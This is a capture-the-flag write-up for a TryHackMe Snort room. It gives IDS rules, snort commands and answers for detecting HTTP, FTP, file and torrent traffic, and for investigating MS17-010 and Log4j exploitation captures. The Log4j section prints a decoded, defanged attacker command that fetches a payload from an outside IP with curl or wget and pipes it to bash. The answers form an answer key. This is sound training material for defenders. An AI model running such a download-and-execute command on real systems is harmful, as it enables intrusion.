# [Snort Challenge - The basics](https://tryhackme.com/room/snortchallenges1)

![snort commands](<../Helpful Files/snort-101-commands.png>)

![snort rule breakdown](<../Helpful Files/snort-101-rule-breakdown.png>)

***

# Task 1 - Introduction

Exercises for each task are located on the desktop: `/home/ubuntu/Desktop/Exercise-Files/`

***

# Task 2 - Writing IDS Rules (HTTP)
## Write a rule to detect all TCP packets **from or to** port 80.

The rule is as follows in local.rules: `alert tcp any 80 <> any any (msg:"TCP 80 Packet Found"; sid:1000001; rev:1;)`  
To utilise the rule and inspect the given pcap file, I'll use the following command inside the `TASK-2 (HTTP)` folder: `sudo snort -c local.rules -A full -l . -r mx-3.pcap`  

Breakdown:
- `sudo` as Snort requires elevated rights by default. I am logged in as a regular user, and thus must use sudo.
- `snort -c local.rules` to specify the file with the rule set that I want to use.  
- `-A full` to specify that I want the *full* alert mode to be used. This means that any alerts are added to the alert file that exists, or will be generated, along with the full decoded header from the packet.  
- `-l .` to specify that I want any generated logs in the same folder where the command is issued.  
- `-r mx-3.pcap` specifies that I want all of this to be used with the `mx-3.pcap` file that exists in the same directory.

### What is the number of detected packets from or to port 80?  

> 164  

### Investigate the log file: What is the destination address of packet 63?  

To find packet 63: `sudo snort -r snort.log.{unix-timestamp} -n 63`  
`-n` specifies how many packets to process before quitting.   
> `216.239.59.99`  

### What is the ACK number of packet 64?  

Again, utilising `-n`, it's quite fast to find packet 64 and extract the ACK number. 
> `0x2E6B5384`

### What is the SEQ number of packet 62?

`-n` could be used again. The previous question was regarding packet 64, so simply looking 2 packets prior, it's fast to find the SEQ.  
> `0x36C21E28`

### What is the TTL of packet 65?

`-n` had to be used again. Luckily, the last questions are regarding the same packet.  
> 128

### What is the source IP of packet 65?

> `145.254.160.237`

### What is the source port of packet 65?
> `3372`

***

# Task 3 - Writing IDS Rules (FTP)
## Write a **single** rule to detect *all TCP port 21* traffic in the given pcap.

The rule is as follows in local.rules: `alert tcp any 21 <> any any (msg:"TCP 21 Packet Found"; sid:1000001; rev:1;)`  

To utilise the rule and inspect the given pcap file, I'll use the following command inside the `TASK-3 (FTP)` folder: `sudo snort -c local.rules -A full -l . -r ftp-png-gif.pcap`  

### What is the number of detected packets?
> 307

### What is the FTP service name?
I figured the service name would show quite early in the traffic.  
I used `snort -r snort.log.{unix-timestamp} -X -n 5`.  
`-X` prints the raw data from the link layer. `-d` could also have been used, as it dumps the data from the application layer.  
The answer shows in packet 4.
> Microsoft FTP Service

## Deactivate old rules, and write a rule to detect failed FTP login attempts in the given pcap.
Looking at [FTP server return codes](https://en.wikipedia.org/wiki/List_of_FTP_server_return_codes), there are a few possible things to look at, but `530` might be useful. This would require inspecting the content of the packet for any `530`. `content` can be useful for this.  

The new rule would then be: `alert tcp any any <> any any (msg:"FTP failed login"; content:"530"; sid:1000001; rev:1;)`

### What is the number of detected packets?
> 41

## Deactivate old rules, and write a rule to detect successful FTP logins in the given pcap.
Looking at the same links as earlier, `230` might be useful.

The new rule would then be: `alert tcp any any <> any any (msg:"FTP login successful"; content:"230"; sid:1000001; rev:1;)`

### What is the number of detected packets?
> 1

## Deactivate old rules, and write a rule to detect FTP login attempts with a valid username but no password entered yet.
Again, the link is useful. `331` looks promising.

The new rule would then be: `alert tcp any any <> any any (msg:"Username OK, password needed"; content:"331"; sid:1000001; rev:1;)`

### What is the number of detected packets?
> 42

## Deactivate old rules, and write a rule to detect FTP login attempts with the "Administrator" username, but no password entered yet.
This one requires combining `331` along with the given username.

The new rule would then be: `alert tcp any any <> any any (msg:"User Admin, Password needed"; content:"Administrator"; content:"331"; sid:1000001; rev:1;)`

### What is the number of detected packets?
> 7

***

# Task 4 - Writing IDS Rules (PNG)
## Write a rule to detect the PNG file in the given pcap.

### Investigate the logs and identify the software name embedded in the packet.
Using [List of file signatures](https://en.wikipedia.org/wiki/List_of_file_signatures), it's possible to find the hex `89 50 4E 47 0D 0A 1A 0A` that identifies PNG in the packets.

The rule would then be: `alert tcp any any <> any any (msg:"PNG Packet Found"; content:"|89 50 4E 47 0D 0A 1A 0A|"; sid:1000001; rev:1;)`  

Reading the snort.log with `sudo snort -r snort.log.{unix-timestamp} -X` allows us to inspect the content of the packet, which contains the software name.  

> Adobe ImageReady

## Deactivate old rules, and write a rule to detect the GIF file in the given pcap.
The [List of file signatures](https://en.wikipedia.org/wiki/List_of_file_signatures) has two entries for GIFs, and we'll utilise the first one `47 49 46 38 37 61`.  
The rule will then be: `alert tcp any any <> any any (msg:"GIF Packet Found"; content:"|47 49 46 38 37 61|"; sid:1000001; rev:1;)`

This resulted in no alerts and no logs.

Attempting with `47 49 46 38 39 61` might yield something.  
Rule: `alert tcp any any <> any any (msg:"GIF Packet Found"; content:"|47 49 46 38 39 61|"; sid:1000001; rev:1;)`  

This resulted in alerts for 4 packets, all utilising the same GIF format.

### Investigate the logs and identify the image format embedded in the packet.
> GIF89a

***

# Task 5 - Writing IDS Rules (Torrent Metafile)
## Write a rule to detect the torrent metafile in the given pcap.
Torrent files can often be identified by the `.torrent` file extension, and that is what we will be searching for here.  

Rule: `alert tcp any any <> any any (msg:"Torrent File Found"; content:".torrent"; sid:1000001; rev:1;)`

### What is the number of detected packets?
> 2

### What is the name of the torrent application?
Reading the snort log with `-X` lets us see `Accept: application/x-bittorrent`. Googling x-bittorrent simply yields `bittorrent`, which is the correct answer.
> bittorrent

### What is the MIME (Multipurpose Internet Mail Extensions) type of the torrent metafile?
> application/x-bittorrent

### What is the hostname of the torrent metafile?
> tracker2.torrentbox.com

***

# Task 6 - Troubleshooting Rule Syntax Errors
## In this section, you need to fix syntax errors in the given rule files.

### Fix the syntax error in local-1.rules. What is the number of detected packets?
Original: `alert tcp any 3372 -> any any(msg: "Troubleshooting 1"; sid:1000001; rev:1;)`  

Fixed: `alert tcp any 3372 -> any any (msg: "Troubleshooting 1"; sid:1000001; rev:2;)`  
> 16  

The fix was to input a whitespace between `any` and `(`.

### Fix the syntax error in local-2.rules. What is the number of detected packets?
Original: `alert icmp any -> any any (msg: "Troubleshooting 2"; sid:1000001; rev:1;)`  

Fixed: `alert icmp any any -> any any (msg: "Troubleshooting 2"; sid:1000001; rev:2;)`  
> 68

The fix was to input a `source port` to the rule.

### Fix the syntax error in local-3.rules. What is the number of detected packets?
Original:  
`alert icmp any any -> any any (msg: "ICMP Packet Found"; sid:1000001; rev:1;)`  
`alert tcp any any -> any 80,443 (msg: "HTTPX Packet Found"; sid:1000001; rev:1;)`

Fixed:  
`alert icmp any any -> any any (msg: "ICMP Packet Found"; sid:1000001; rev:1;)`  
`alert tcp any any -> any 80,443 (msg: "HTTPX Packet Found"; sid:1000002; rev:2;)`

> 87

The fix was to update `sid` on rule two.

### Fix the syntax error in local-4.rules. What is the number of detected packets?
Original:  
`alert icmp any any -> any any (msg: "ICMP Packet Found"; sid:1000001; rev:1;)`  
`alert tcp any 80,443 -> any any (msg: "HTTPX Packet Found": sid:1000001; rev:1;)`  

Fixed:  
`alert icmp any any -> any any (msg: "ICMP Packet Found"; sid:1000001; rev:1;)`  
`alert tcp any 80,443 -> any any (msg: "HTTPX Packet Found"; sid:1000002; rev:2;)`  

> 90

The fix was to update `sid`, along with changing the `:` to `;` after the `msg`, both of these fixes in rule 2.

### Fix the syntax error in local-5.rules. What is the number of detected packets?
Original:  
`alert icmp any any <> any any (msg: "ICMP Packet Found"; sid:1000001; rev:1;)`  
`alert icmp any any <- any any (msg: "Inbound ICMP Packet Found"; sid;1000002; rev:1;)`  
`alert tcp any any -> any 80,443 (msg: "HTTPX Packet Found": sid:1000003; rev:1;)`  

Fixed:  
`alert icmp any any <> any any (msg: "ICMP Packet Found"; sid:1000001; rev:1;)`  
`alert icmp any any -> any any (msg: "Inbound ICMP Packet Found"; sid:1000002; rev:2;)`  
`alert tcp any any -> any 80,443 (msg: "HTTPX Packet Found"; sid:1000003; rev:2;)`  
> 155

The fix was as follows:  
In rule 2, change `<-` to `->`, as it is a forbidden flow in Snort. Also change `sid;` to `sid:`.  
In rule 3, change `Found":` to `Found";` as `;` is needed to delimit the rule contents.

### Fix the logical error in local-6.rules. What is the number of detected packets?
Original:  
`alert tcp any any <> any 80  (msg: "GET Request Found"; content:"|67 65 74|"; sid: 100001; rev:1;)`  

Fixed:  
`alert tcp any any <> any 80  (msg: "GET Request Found"; content:"|67 65 74|"; nocase; sid: 100001; rev:2;)`  
or  
`alert tcp any any <> any 80 (msg:"GET Request Found"; content:"GET"; sid:1000001; rev:1;)`  

> 2

The fix was to either check the content case-insensitive by utilising `nocase` as is shown in the first example. The other way was to change the content to `GET` instead of `|67 65 74|`, as that is `get` in hex.

### Fix the logical error in local-7.rules. What is the name of the required option?
Original:  
`alert tcp any any <> any 80  (content:"|2E 68 74 6D 6C|"; sid: 100001; rev:1;)`  

Fixed:  
`alert tcp any any <> any 80  (msg:"HTML Packet Found"; content:"|2E 68 74 6D 6C|"; sid: 100001; rev:2;)`

> msg

The fix was to insert the `msg` into the alert, since it is illogical to check for errors and create alerts if they do not tell us what they discover and what is erroneous.

***

# Task 7 - Using External Rules (MS17-010)
## Use the given local.rules to investigate the ms1710 exploitation in the pcap file.
Inspecting the `local.rules` reveals quite a few rules, and is fun to analyse for a bit, but simply executing `sudo snort -c local.rules -A full -l . -r ms-17-010.pcap` reveals the answer to the first question.

### What is the number of detected packets?
> 25154

### Use the local-1.rules empty file to write a new rule to detect payloads containing the "\IPC$" keyword. What is the number of detected packets?
Simply looking for the keyword gives us the following rule:  
`alert tcp any any <> any any (msg:"IPC$ keyword found!"; content:"\\IPC$"; sid:1000001; rev:1;)`

> 12

`\` is often used as an escape character, which means we have to escape that function by providing the `\` twice inside the content in the rule. If we don't, we'll encounter an error.

### Investigate the log. What is the requested path?
> \\192.168.116.138\IPC$

Utilising `sudo snort -r {log} -X` allows us to see into the packets in the log, which gives us the answer.

### What is the CVSS v2 score of the MS17-010 vulnerability?
A quick search and a visit to https://nvd.nist.gov/vuln/detail/CVE-2017-0144 grants us the answer.

> 9.3

***

# Task 8 - Using External Rules (Log4j)
## Use the given pcap file with the local.rules to investigate the log4j exploitation.
Reading the contents of the local.rules file is a fun way to get new knowledge, but getting the answer to the next question simply requires us to read the pcap with Snort, as we've done so many times before.

### What is the number of detected packets?
> 26

### How many rules were triggered?
> 4

Looking at the Snort summary output after reading the pcap file, we can see that 4 events are triggered.

### What are the first six digits of the triggered rule sids?
> 210037

Looking at the summary, we can see the events and their id. These can also be found by searching for sid through the contents of the log.

## Use local-1.rules empty file to write a new rule to detect packet payloads between 770 and 855 bytes.
A quick search led me to https://docs.snort.org/rules/options/payload/dsize which tells how to check for payload size.  
Using this leads me to believe that a `dsize:770<>855` would be useful in a rule:  
`alert tcp any any <> any any (msg:"Packet size between 770 and 855 bytes!"; dsize:770<>855; sid:1000001; rev:1;)`  

### What is the number of detected packets?
> 41

### Investigate the log. What is the name of the used encoding algorithm?
Investigating the log using -X didn't reveal much useful, but finding readable strings using `strings` reveals the `Base64` encoding, in the User-Agent of the packet.
> Base64

### What is the IP ID of the corresponding packet?
In the User-Agent we find the source IP address.  
Using this `45.155.205.233` with strings and grep, we can find the corresponding IP ID of the packet.
`sudo strings alert | grep -e 45.155.205.233 -e ID`
The ID will show on the following line, of the IP address.
> 62808

### Decode the encoded command. What is the attacker's command?
Going back to the User-Agent we see an encoded message after the `Base64/`. This encoded message can be decoded in a few ways, but a quick way is by utilising CyberChef, which will return the answer to us.  
The answer here is defanged for good measure.
> (curl -s 45[.]155[.]205[.]233:5874/162[.]0[.]228[.]253:80||wget -q -O- 45[.]155[.]205[.]233:5874/162[.]0[.]228[.]253:80)|bash

### What is the CVSS v2 score of the Log4j vulnerability?
A quick search reveals the score.
> 9.3